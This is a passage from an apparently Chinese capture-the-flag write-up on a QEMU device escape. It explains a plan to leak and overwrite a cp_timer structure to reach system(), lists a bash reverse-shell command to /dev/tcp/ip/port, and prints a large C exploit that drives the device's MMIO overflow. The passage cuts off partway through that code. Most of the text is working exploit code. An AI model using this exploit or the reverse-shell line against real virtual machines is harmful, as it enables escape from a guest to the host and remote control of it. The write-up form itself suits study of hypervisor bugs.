<a class="sourceLine" id="cb13-24" title="24"></a>
<a class="sourceLine" id="cb13-25" title="25">    <span class="cf">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="dv">0</span>){</a>
<a class="sourceLine" id="cb13-26" title="26">        puts(<span class="st">&quot;lseek&quot;</span>);</a>
<a class="sourceLine" id="cb13-27" title="27">        close(fd);</a>
<a class="sourceLine" id="cb13-28" title="28">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb13-29" title="29">    }</a>
<a class="sourceLine" id="cb13-30" title="30"></a>
<a class="sourceLine" id="cb13-31" title="31">    <span class="cf">if</span>(read(fd,&amp;data,<span class="dv">8</span>) != <span class="dv">8</span>){</a>
<a class="sourceLine" id="cb13-32" title="32">        puts(<span class="st">&quot;read&quot;</span>);</a>
<a class="sourceLine" id="cb13-33" title="33">        close(fd);</a>
<a class="sourceLine" id="cb13-34" title="34">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb13-35" title="35">    }</a>
<a class="sourceLine" id="cb13-36" title="36"></a>
<a class="sourceLine" id="cb13-37" title="37">    <span class="cf">if</span>(!(data &amp; (((<span class="dt">uint64_t</span>)<span class="dv">1</span> &lt;&lt; <span class="dv">63</span>)))){</a>
<a class="sourceLine" id="cb13-38" title="38">        puts(<span class="st">&quot;page&quot;</span>);</a>
<a class="sourceLine" id="cb13-39" title="39">        close(fd);</a>
<a class="sourceLine" id="cb13-40" title="40">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb13-41" title="41">    }</a>
<a class="sourceLine" id="cb13-42" title="42"></a>
<a class="sourceLine" id="cb13-43" title="43">    <span class="dt">size_t</span> pageframenum = data &amp; ((<span class="dv">1</span><span class="bu">ull</span> &lt;&lt; <span class="dv">55</span>) - <span class="dv">1</span>);</a>
<a class="sourceLine" id="cb13-44" title="44">    <span class="dt">size_t</span> phyaddr = pageframenum * pagesize + (<span class="dt">uintptr_t</span>)addr % pagesize;</a>
<a class="sourceLine" id="cb13-45" title="45"></a>
<a class="sourceLine" id="cb13-46" title="46">    close(fd);</a>
<a class="sourceLine" id="cb13-47" title="47"></a>
<a class="sourceLine" id="cb13-48" title="48">    <span class="cf">return</span> phyaddr;</a>
<a class="sourceLine" id="cb13-49" title="49">}</a>
<a class="sourceLine" id="cb13-50" title="50"></a>
<a class="sourceLine" id="cb13-51" title="51"><span class="dt">int</span> main(){</a>
<a class="sourceLine" id="cb13-52" title="52">    <span class="dt">char</span> *userbuf;</a>
<a class="sourceLine" id="cb13-53" title="53">    <span class="dt">uint64_t</span> userbuf_pa;</a>
<a class="sourceLine" id="cb13-54" title="54">    <span class="dt">unsigned</span> <span class="dt">char</span>* mmio_mem;</a>
<a class="sourceLine" id="cb13-55" title="55"></a>
<a class="sourceLine" id="cb13-56" title="56">    <span class="dt">int</span> mmio_fd = open(<span class="st">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</a>
<a class="sourceLine" id="cb13-57" title="57">    <span class="cf">if</span> (mmio_fd == -<span class="dv">1</span>){</a>
<a class="sourceLine" id="cb13-58" title="58">        perror(<span class="st">&quot;open mmio&quot;</span>);</a>
<a class="sourceLine" id="cb13-59" title="59">        exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb13-60" title="60">    }</a>
<a class="sourceLine" id="cb13-61" title="61"></a>
<a class="sourceLine" id="cb13-62" title="62">    mmio_mem = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb13-63" title="63">    <span class="cf">if</span> (mmio_mem == MAP_FAILED){</a>
<a class="sourceLine" id="cb13-64" title="64">        perror(<span class="st">&quot;mmap mmio&quot;</span>);</a>
<a class="sourceLine" id="cb13-65" title="65">        exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb13-66" title="66">    }</a>
<a class="sourceLine" id="cb13-67" title="67"></a>
<a class="sourceLine" id="cb13-68" title="68">    printf(<span class="st">&quot;mmio_mem:</span><span class="sc">\t</span><span class="st">%p</span><span class="sc">\n</span><span class="st">&quot;</span>, mmio_mem);</a>
<a class="sourceLine" id="cb13-69" title="69"></a>
<a class="sourceLine" id="cb13-70" title="70">    userbuf = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -<span class="dv">1</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb13-71" title="71">    <span class="cf">if</span> (userbuf == MAP_FAILED){</a>
<a class="sourceLine" id="cb13-72" title="72">        perror(<span class="st">&quot;mmap userbuf&quot;</span>);</a>
<a class="sourceLine" id="cb13-73" title="73">        exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb13-74" title="74">    }</a>
<a class="sourceLine" id="cb13-75" title="75"></a>
<a class="sourceLine" id="cb13-76" title="76">    strcpy(userbuf,<span class="st">&quot;test&quot;</span>);</a>
<a class="sourceLine" id="cb13-77" title="77"></a>
<a class="sourceLine" id="cb13-78" title="78">    mlock(userbuf, <span class="bn">0x1000</span>);</a>
<a class="sourceLine" id="cb13-79" title="79">    userbuf_pa = va2pa(userbuf);</a>
<a class="sourceLine" id="cb13-80" title="80"></a>
<a class="sourceLine" id="cb13-81" title="81">    printf(<span class="st">&quot;userbuf_va:</span><span class="sc">\t</span><span class="st">%p</span><span class="sc">\n</span><span class="st">&quot;</span>,userbuf);</a>
<a class="sourceLine" id="cb13-82" title="82">    printf(<span class="st">&quot;userbuf_pa:</span><span class="sc">\t</span><span class="st">%p</span><span class="sc">\n</span><span class="st">&quot;</span>,(<span class="dt">void</span> *)userbuf_pa);</a>
<a class="sourceLine" id="cb13-83" title="83">}</a></code></pre></div>
<h3 id="漏洞利用-1">3. 漏洞利用</h3>
<ul>
<li>通过溢出的读取，泄露 cp_timer 结构体，其中存在 PIE 基址（计算出 system@plt 的地址）和堆地址（整个结构的位置在堆上，计算出结构的开始位置，才能得到我们写入 system 参数的位置）。</li>
<li>通过溢出的写入，覆盖 cp_timer 结构体控制程序执行流</li>
</ul>
<p>触发时钟可以利用两种方式：</p>
<ul>
<li>虚拟机重启或关机的时候会触发时钟，调用 cb(opaque)</li>
<li>在 MMOI WRITE 中可以触发时钟</li>
</ul>
<p>system 执行内容：</p>
<ul>
<li>cat /flag</li>
<li>反弹 shell，/bin/bash -c ‘bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1’，在 QEMU 逃逸中，执行 system(“/bin/bash”) 是无法拿到 shell 的，或者说是无法与 shell 内容交互的，必须使用反弹 shell 的形式才能够拿到 shell。</li>
<li>弹出计算器，gnome-calculator，这个大概比较适合用于做演示视频吧。</li>
</ul>
<p>注意：所有在设备中的操作地址都是指 QEMU 模拟的物理地址，但是程序中使用 mmap 申请的是虚拟地址空间。所以要注意使用 mmap 申请出来的超过一页的部分，在物理空间上不连续。如果需要操作那块空间，需要使用那一页的虚拟地址重新计算对应的物理地址。这个性质在这道题中（超过 0x1000 的物理地址复制），需要额外的注意。</p>
<h3 id="exploit-1">4. Exploit</h3>
<div class="sourceCode" id="cb14"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb14-1" title="1"><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></a>
<a class="sourceLine" id="cb14-2" title="2"><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></a>
<a class="sourceLine" id="cb14-3" title="3"><span class="pp">#include </span><span class="im">&lt;sys/mman.h&gt;</span></a>
<a class="sourceLine" id="cb14-4" title="4"><span class="pp">#include </span><span class="im">&lt;sys/io.h&gt;</span></a>
<a class="sourceLine" id="cb14-5" title="5"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></a>
<a class="sourceLine" id="cb14-6" title="6"><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></a>
<a class="sourceLine" id="cb14-7" title="7"><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></a>
<a class="sourceLine" id="cb14-8" title="8"><span class="pp">#include </span><span class="im">&lt;assert.h&gt;</span></a>
<a class="sourceLine" id="cb14-9" title="9"></a>
<a class="sourceLine" id="cb14-10" title="10"><span class="pp">#define HEX(x) printf(&quot;[*]0x%016lx\n&quot;, (size_t)x)</span></a>
<a class="sourceLine" id="cb14-11" title="11"><span class="pp">#define LOG(addr) printf(&quot;[*]%s\n&quot;, addr)</span></a>
<a class="sourceLine" id="cb14-12" title="12"></a>
<a class="sourceLine" id="cb14-13" title="13"><span class="dt">unsigned</span> <span class="dt">char</span>* mmio_mem;</a>
<a class="sourceLine" id="cb14-14" title="14"><span class="dt">uint64_t</span> phy_userbuf;</a>
<a class="sourceLine" id="cb14-15" title="15"><span class="dt">char</span> *userbuf;</a>
<a class="sourceLine" id="cb14-16" title="16"><span class="dt">uint64_t</span> phy_userbuf1;</a>
<a class="sourceLine" id="cb14-17" title="17"><span class="dt">uint64_t</span> phy_buf0;</a>
<a class="sourceLine" id="cb14-18" title="18"><span class="dt">char</span> *userbuf1;</a>
<a class="sourceLine" id="cb14-19" title="19"><span class="dt">int</span> fd;</a>
<a class="sourceLine" id="cb14-20" title="20"><span class="dt">void</span> Err(<span class="dt">char</span>* err){</a>
<a class="sourceLine" id="cb14-21" title="21">    printf(<span class="st">&quot;Error: %s</span><span class="sc">\n</span><span class="st">&quot;</span>, err);</a>
<a class="sourceLine" id="cb14-22" title="22">    exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-23" title="23">}</a>
<a class="sourceLine" id="cb14-24" title="24"></a>
<a class="sourceLine" id="cb14-25" title="25"><span class="dt">void</span> init_mmio(){</a>
<a class="sourceLine" id="cb14-26" title="26">    <span class="dt">int</span> mmio_fd = open(<span class="st">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</a>
<a class="sourceLine" id="cb14-27" title="27">    <span class="cf">if</span>(mmio_fd &lt; <span class="dv">0</span>){</a>
<a class="sourceLine" id="cb14-28" title="28">        Err(<span class="st">&quot;Open pci&quot;</span>);</a>
<a class="sourceLine" id="cb14-29" title="29">    }</a>
<a class="sourceLine" id="cb14-30" title="30">    mmio_mem = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb14-31" title="31">    <span class="cf">if</span>(mmio_mem&lt;<span class="dv">0</span>){</a>
<a class="sourceLine" id="cb14-32" title="32">        Err(<span class="st">&quot;mmap mmio_mem&quot;</span>);</a>
<a class="sourceLine" id="cb14-33" title="33">    }</a>
<a class="sourceLine" id="cb14-34" title="34">}</a>
<a class="sourceLine" id="cb14-35" title="35"></a>
<a class="sourceLine" id="cb14-36" title="36"><span class="dt">void</span> mmio_write(<span class="dt">uint64_t</span> addr, <span class="dt">uint64_t</span> value){</a>
<a class="sourceLine" id="cb14-37" title="37">    *((<span class="dt">uint64_t</span>*)(mmio_mem+addr)) = value;</a>
<a class="sourceLine" id="cb14-38" title="38">}</a>
<a class="sourceLine" id="cb14-39" title="39"></a>
<a class="sourceLine" id="cb14-40" title="40"><span class="dt">uint64_t</span> mmio_read(<span class="dt">uint64_t</span> addr){</a>
<a class="sourceLine" id="cb14-41" title="41">    <span class="cf">return</span> *((<span class="dt">uint64_t</span>*)(mmio_mem+addr)); </a>
<a class="sourceLine" id="cb14-42" title="42">}</a>
<a class="sourceLine" id="cb14-43" title="43"></a>
<a class="sourceLine" id="cb14-44" title="44"><span class="dt">void</span> set_list_cnt(<span class="dt">uint64_t</span> cnt){</a>
<a class="sourceLine" id="cb14-45" title="45">    mmio_write(<span class="bn">0x10</span>, cnt);</a>
<a class="sourceLine" id="cb14-46" title="46">}</a>
<a class="sourceLine" id="cb14-47" title="47"></a>
<a class="sourceLine" id="cb14-48" title="48"><span class="dt">void</span> set_src(<span class="dt">uint64_t</span> src){</a>
<a class="sourceLine" id="cb14-49" title="49">    mmio_write(<span class="bn">0x8</span>, src);</a>
<a class="sourceLine" id="cb14-50" title="50">}</a>
<a class="sourceLine" id="cb14-51" title="51"></a>
<a class="sourceLine" id="cb14-52" title="52"><span class="dt">void</span> set_cmd(<span class="dt">uint64_t</span> cmd){</a>
<a class="sourceLine" id="cb14-53" title="53">    mmio_write(<span class="bn">0x18</span>, cmd);</a>
<a class="sourceLine" id="cb14-54" title="54">}</a>
<a class="sourceLine" id="cb14-55" title="55"></a>
<a class="sourceLine" id="cb14-56" title="56"><span class="dt">void</span> set_read(<span class="dt">uint64_t</span> cnt){</a>
<a class="sourceLine" id="cb14-57" title="57">    set_src(phy_userbuf);</a>
<a class="sourceLine" id="cb14-58" title="58">    set_list_cnt(cnt);</a>
<a class="sourceLine" id="cb14-59" title="59"></a>
<a class="sourceLine" id="cb14-60" title="60">    set_cmd(<span class="bn">0x4</span>);</a>
<a class="sourceLine" id="cb14-61" title="61">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-62" title="62">}</a>
<a class="sourceLine" id="cb14-63" title="63"></a>
<a class="sourceLine" id="cb14-64" title="64"><span class="dt">void</span> set_write(<span class="dt">uint64_t</span> cnt){</a>
<a class="sourceLine" id="cb14-65" title="65">    set_src(phy_userbuf);</a>
<a class="sourceLine" id="cb14-66" title="66">    set_list_cnt(cnt);</a>
<a class="sourceLine" id="cb14-67" title="67"></a>
<a class="sourceLine" id="cb14-68" title="68">    set_cmd(<span class="bn">0x2</span>);</a>
<a class="sourceLine" id="cb14-69" title="69">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-70" title="70">}</a>
<a class="sourceLine" id="cb14-71" title="71"></a>
<a class="sourceLine" id="cb14-72" title="72"><span class="dt">void</span> set_read_write(<span class="dt">uint64_t</span> cnt){</a>
<a class="sourceLine" id="cb14-73" title="73">    set_src(phy_userbuf);</a>
<a class="sourceLine" id="cb14-74" title="74">    set_list_cnt(cnt);</a>
<a class="sourceLine" id="cb14-75" title="75"></a>
<a class="sourceLine" id="cb14-76" title="76">    set_cmd(<span class="bn">0x1</span>);</a>
<a class="sourceLine" id="cb14-77" title="77">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-78" title="78">}</a>
<a class="sourceLine" id="cb14-79" title="79"></a>
<a class="sourceLine" id="cb14-80" title="80"><span class="pp">#define PAGE_SHIFT 12</span></a>
<a class="sourceLine" id="cb14-81" title="81"><span class="pp">#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></a>
<a class="sourceLine" id="cb14-82" title="82"><span class="pp">#define PFN_PRESENT (1ull &lt;&lt; 63)</span></a>
<a class="sourceLine" id="cb14-83" title="83"><span class="pp">#define PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></a>
<a class="sourceLine" id="cb14-84" title="84"><span class="dt">int</span> fd;</a>
<a class="sourceLine" id="cb14-85" title="85"><span class="dt">uint32_t</span> page_offset(<span class="dt">uint32_t</span> addr)</a>
<a class="sourceLine" id="cb14-86" title="86">{</a>
<a class="sourceLine" id="cb14-87" title="87">    <span class="cf">return</span> addr &amp; ((<span class="dv">1</span> &lt;&lt; PAGE_SHIFT) - <span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-88" title="88">}</a>
<a class="sourceLine" id="cb14-89" title="89"></a>
<a class="sourceLine" id="cb14-90" title="90"><span class="dt">uint64_t</span> gva_to_gfn(<span class="dt">void</span> *addr)</a>
<a class="sourceLine" id="cb14-91" title="91">{</a>
<a class="sourceLine" id="cb14-92" title="92">    <span class="dt">uint64_t</span> pme, gfn;</a>
<a class="sourceLine" id="cb14-93" title="93">    <span class="dt">size_t</span> offset;</a>
<a class="sourceLine" id="cb14-94" title="94">    offset = ((<span class="dt">uintptr_t</span>)addr &gt;&gt; <span class="dv">9</span>) &amp; ~<span class="dv">7</span>;</a>
<a class="sourceLine" id="cb14-95" title="95">    <span class="co">// ((uintptr_t)addr &gt;&gt; 12)&lt;&lt;3</span></a>
<a class="sourceLine" id="cb14-96" title="96">    lseek(fd, offset, SEEK_SET);</a>
<a class="sourceLine" id="cb14-97" title="97">    read(fd, &amp;pme, <span class="dv">8</span>);</a>
<a class="sourceLine" id="cb14-98" title="98">    <span class="cf">if</span> (!(pme &amp; PFN_PRESENT))</a>
<a class="sourceLine" id="cb14-99" title="99">        <span class="cf">return</span> -<span class="dv">1</span>;</a>
<a class="sourceLine" id="cb14-100" title="100">    gfn = pme &amp; PFN_PFN;</a>
<a class="sourceLine" id="cb14-101" title="101">    <span class="cf">return</span> gfn;</a>
<a class="sourceLine" id="cb14-102" title="102">}</a>
<a class="sourceLine" id="cb14-103" title="103"></a>
<a class="sourceLine" id="cb14-104" title="104"><span class="co">/*</span></a>
<a class="sourceLine" id="cb14-105" title="105"><span class="co">* transfer visual address to physic address</span></a>
<a class="sourceLine" id="cb14-106" title="106"><span class="co">*/</span></a>
<a class="sourceLine" id="cb14-107" title="107"><span class="dt">uint64_t</span> gva_to_gpa(<span class="dt">void</span> *addr)</a>
<a class="sourceLine" id="cb14-108" title="108">{</a>
<a class="sourceLine" id="cb14-109" title="109">    <span class="dt">uint64_t</span> gfn = gva_to_gfn(addr);</a>
<a class="sourceLine" id="cb14-110" title="110">    <span class="cf">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="dt">uint64_t</span>)addr);</a>
<a class="sourceLine" id="cb14-111" title="111">}</a>
<a class="sourceLine" id="cb14-112" title="112"></a>
<a class="sourceLine" id="cb14-113" title="113"></a>
<a class="sourceLine" id="cb14-114" title="114"><span class="dt">size_t</span> va2pa(<span class="dt">void</span> *addr){</a>
<a class="sourceLine" id="cb14-115" title="115">    <span class="dt">uint64_t</span> data;</a>
<a class="sourceLine" id="cb14-116" title="116"></a>
<a class="sourceLine" id="cb14-117" title="117">    <span class="dt">size_t</span> pagesize = getpagesize();</a>
<a class="sourceLine" id="cb14-118" title="118">    <span class="dt">size_t</span> offset = ((<span class="dt">uintptr_t</span>)addr / pagesize) * <span class="kw">sizeof</span>(<span class="dt">uint64_t</span>);</a>
<a class="sourceLine" id="cb14-119" title="119"></a>
<a class="sourceLine" id="cb14-120" title="120">    <span class="cf">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="dv">0</span>){</a>
<a class="sourceLine" id="cb14-121" title="121">        puts(<span class="st">&quot;lseek&quot;</span>);</a>
<a class="sourceLine" id="cb14-122" title="122">        close(fd);</a>
<a class="sourceLine" id="cb14-123" title="123">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-124" title="124">    }</a>
<a class="sourceLine" id="cb14-125" title="125"></a>
<a class="sourceLine" id="cb14-126" title="126">    <span class="cf">if</span>(read(fd,&amp;data,<span class="dv">8</span>) != <span class="dv">8</span>){</a>
<a class="sourceLine" id="cb14-127" title="127">        puts(<span class="st">&quot;read&quot;</span>);</a>
<a class="sourceLine" id="cb14-128" title="128">        close(fd);</a>
<a class="sourceLine" id="cb14-129" title="129">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-130" title="130">    }</a>
<a class="sourceLine" id="cb14-131" title="131"></a>
<a class="sourceLine" id="cb14-132" title="132">    <span class="cf">if</span>(!(data &amp; (((<span class="dt">uint64_t</span>)<span class="dv">1</span> &lt;&lt; <span class="dv">63</span>)))){</a>
<a class="sourceLine" id="cb14-133" title="133">        puts(<span class="st">&quot;page&quot;</span>);</a>
<a class="sourceLine" id="cb14-134" title="134">        close(fd);</a>
<a class="sourceLine" id="cb14-135" title="135">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-136" title="136">    }</a>
<a class="sourceLine" id="cb14-137" title="137"></a>
<a class="sourceLine" id="cb14-138" title="138">    <span class="dt">size_t</span> pageframenum = data &amp; ((<span class="dv">1</span><span class="bu">ull</span> &lt;&lt; <span class="dv">55</span>) - <span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-139" title="139">    <span class="dt">size_t</span> phyaddr = pageframenum * pagesize + (<span class="dt">uintptr_t</span>)addr % pagesize;</a>
<a class="sourceLine" id="cb14-140" title="140"></a>
<a class="sourceLine" id="cb14-141" title="141">    close(fd);</a>
<a class="sourceLine" id="cb14-142" title="142"></a>
<a class="sourceLine" id="cb14-143" title="143">    <span class="cf">return</span> phyaddr;</a>
<a class="sourceLine" id="cb14-144" title="144">}</a>
<a class="sourceLine" id="cb14-145" title="145"></a>
<a class="sourceLine" id="cb14-146" title="146"><span class="dt">void</span> print_hex(<span class="dt">uint64_t</span> len, <span class="dt">uint64_t</span> offset){</a>
<a class="sourceLine" id="cb14-147" title="147">    printf(<span class="st">&quot;===========================</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-148" title="148">    <span class="cf">for</span>(<span class="dt">int</span> i = <span class="dv">0</span>; i&lt;len/<span class="dv">8</span>; i++){</a>
<a class="sourceLine" id="cb14-149" title="149">        printf(<span class="st">&quot;    0x%lx</span><span class="sc">\n</span><span class="st">&quot;</span>, *(<span class="dt">uint64_t</span>*)(userbuf1+offset+i*<span class="dv">8</span>));</a>
<a class="sourceLine" id="cb14-150" title="150">    }</a>
<a class="sourceLine" id="cb14-151" title="151">}</a>
<a class="sourceLine" id="cb14-152" title="152"></a>
<a class="sourceLine" id="cb14-153" title="153"><span class="dt">size_t</span> buf0, buf1;</a>
<a class="sourceLine" id="cb14-154" title="154"></a>
<a class="sourceLine" id="cb14-155" title="155"><span class="dt">void</span> get_pages()</a>
<a class="sourceLine" id="cb14-156" title="156">{</a>
<a class="sourceLine" id="cb14-157" title="157">    <span class="dt">size_t</span> buf[<span class="bn">0x1000</span>];</a>
<a class="sourceLine" id="cb14-158" title="158">    <span class="dt">size_t</span> arry[<span class="bn">0x1000</span>];</a>
<a class="sourceLine" id="cb14-159" title="159">    <span class="dt">size_t</span> arr = mmap(NULL, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="dv">0</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb14-160" title="160">    *(<span class="dt">char</span> *)arr = <span class="ch">&#39;a&#39;</span>;</a>
<a class="sourceLine" id="cb14-161" title="161">    <span class="dt">int</span> n = <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-162" title="162">    buf[n] = gva_to_gfn(arr);</a>
<a class="sourceLine" id="cb14-163" title="163">    arry[n++] = arr;</a>
<a class="sourceLine" id="cb14-164" title="164">    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">1</span>; i &lt; <span class="bn">0x1000</span>; i++)</a>
<a class="sourceLine" id="cb14-165" title="165">    {</a>
<a class="sourceLine" id="cb14-166" title="166">        arr = mmap(NULL, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="dv">0</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb14-167" title="167">        *(<span class="dt">char</span> *)arr = <span class="ch">&#39;a&#39;</span>;</a>
<a class="sourceLine" id="cb14-168" title="168">        <span class="dt">size_t</span> fn = gva_to_gfn(arr);</a>
<a class="sourceLine" id="cb14-169" title="169">        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; n; j++)</a>
<a class="sourceLine" id="cb14-170" title="170">        {</a>
<a class="sourceLine" id="cb14-171" title="171">            <span class="cf">if</span> (buf[j] == fn + <span class="dv">1</span> || buf[j] + <span class="dv">1</span> == fn)</a>
<a class="sourceLine" id="cb14-172" title="172">            {</a>
<a class="sourceLine" id="cb14-173" title="173">                LOG(<span class="st">&quot;consist pages&quot;</span>);</a>
<a class="sourceLine" id="cb14-174" title="174">                HEX(arr);</a>
<a class="sourceLine" id="cb14-175" title="175">                HEX(fn);</a>
<a class="sourceLine" id="cb14-176" title="176">                HEX(arry[j]);</a>
<a class="sourceLine" id="cb14-177" title="177">                HEX(buf[j]);</a>
<a class="sourceLine" id="cb14-178" title="178">                <span class="cf">if</span> (fn &gt; buf[j])</a>
<a class="sourceLine" id="cb14-179" title="179">                {</a>
<a class="sourceLine" id="cb14-180" title="180">                    buf0 = arry[j];</a>
<a class="sourceLine" id="cb14-181" title="181">                    buf1 = arr;</a>
<a class="sourceLine" id="cb14-182" title="182">                    phy_buf0 = (buf[j]&lt;&lt;<span class="dv">12</span>);</a>
<a class="sourceLine" id="cb14-183" title="183">                }</a>
<a class="sourceLine" id="cb14-184" title="184">                <span class="cf">else</span></a>
<a class="sourceLine" id="cb14-185" title="185">                {</a>
<a class="sourceLine" id="cb14-186" title="186">                    buf1 = arry[j];</a>
<a class="sourceLine" id="cb14-187" title="187">                    buf0 = arr;</a>
<a class="sourceLine" id="cb14-188" title="188">                    phy_buf0 = (fn&lt;&lt;<span class="dv">12</span>);</a>
<a class="sourceLine" id="cb14-189" title="189">                }</a>
<a class="sourceLine" id="cb14-190" title="190">                <span class="cf">return</span>;</a>
<a class="sourceLine" id="cb14-191" title="191">            }</a>
<a class="sourceLine" id="cb14-192" title="192">        }</a>
<a class="sourceLine" id="cb14-193" title="193">        buf[n] = fn;</a>
<a class="sourceLine" id="cb14-194" title="194">        arry[n++] = arr;</a>
<a class="sourceLine" id="cb14-195" title="195">    }</a>
<a class="sourceLine" id="cb14-196" title="196">}</a>
<a class="sourceLine" id="cb14-197" title="197"></a>
<a class="sourceLine" id="cb14-198" title="198"><span class="dt">int</span> main(){</a>
<a class="sourceLine" id="cb14-199" title="199"></a>
<a class="sourceLine" id="cb14-200" title="200">    fd = open(<span class="st">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</a>
<a class="sourceLine" id="cb14-201" title="201">    <span class="cf">if</span>(!fd){</a>
<a class="sourceLine" id="cb14-202" title="202">        perror(<span class="st">&quot;open pagemap&quot;</span>);</a>
<a class="sourceLine" id="cb14-203" title="203">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb14-204" title="204">    }</a>
<a class="sourceLine" id="cb14-205" title="205">    get_pages();</a>
<a class="sourceLine" id="cb14-206" title="206"></a>
<a class="sourceLine" id="cb14-207" title="207">    printf(<span class="st">&quot;init mmio:</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-208" title="208">    init_mmio();</a>
<a class="sourceLine" id="cb14-209" title="209"></a>
<a class="sourceLine" id="cb14-210" title="210">    userbuf = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -<span class="dv">1</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb14-211" title="211">    <span class="cf">if</span> (userbuf == MAP_FAILED)</a>
<a class="sourceLine" id="cb14-212" title="212">        Err(<span class="st">&quot;mmap userbuf&quot;</span>);</a>
<a class="sourceLine" id="cb14-213" title="213">    mlock(userbuf, <span class="bn">0x1000</span>);</a>
<a class="sourceLine" id="cb14-214" title="214">    phy_userbuf = va2pa(userbuf);</a>
<a class="sourceLine" id="cb14-215" title="215">    printf(<span class="st">&quot;userbuf va: 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>, userbuf);</a>
<a class="sourceLine" id="cb14-216" title="216">    printf(<span class="st">&quot;userbuf pa: 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>, phy_userbuf);</a>
<a class="sourceLine" id="cb14-217" title="217"></a>
<a class="sourceLine" id="cb14-218" title="218">    memset(buf0, <span class="ch">&#39;a&#39;</span>, <span class="bn">0x1000</span>);</a>
<a class="sourceLine" id="cb14-219" title="219">    memset(buf1, <span class="ch">&#39;a&#39;</span>, <span class="bn">0x1000</span>);</a>
<a class="sourceLine" id="cb14-220" title="220">    printf(<span class="st">&quot;[++++] 0x%lx %p</span><span class="sc">\n</span><span class="st">&quot;</span>, buf0, buf0);</a>
<a class="sourceLine" id="cb14-221" title="221">    printf(<span class="st">&quot;phy_buf0: 0x%lx</span><span class="sc">\n</span><span class="st">&quot;</span>, phy_buf0);</a>
<a class="sourceLine" id="cb14-222" title="222"></a>
<a class="sourceLine" id="cb14-223" title="223">    printf(<span class="st">&quot;leak addr:</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb14-224" title="224">    *(<span class="dt">uint64_t</span>*)(userbuf) = phy_userbuf;</a>
<a class="sourceLine" id="cb14-225" title="225">    *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x8</span>) = <span class="bn">0x1000</span>;</a>
<a class="sourceLine" id="cb14-226" title="226">    *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x10</span>) = phy_buf0;</a>
<a class="sourceLine" id="cb14-227" title="227">    *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0xff8</span>) = phy_buf0;</a>
<a class="sourceLine" id="cb14-228" title="228">    set_write(<span class="bn">0x1</span>);</a>
<a class="sourceLine" id="cb14-229" title="229">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb14-230" title="230">    <span class="cf">for</span>(<span class="dt">int</span> i=<span class="dv">0</span>; i&lt;<span class="dv">17</span>; i++){</a>
<a class="sourceLine" id="cb14-231" title="231">        *(<span class="dt">uint64_t</span>*)(userbuf+i*<span class="bn">0x18</span>) = phy_userbuf;</a>
<a class="sourceLine" id="cb14-232" title="232">        *(<span class="dt">uint64_t</span>*)(userbuf+<span class="bn">0x8</span>+i*<span class="bn">0x18</span>) = <span class="bn">0x1040</span>;</a>
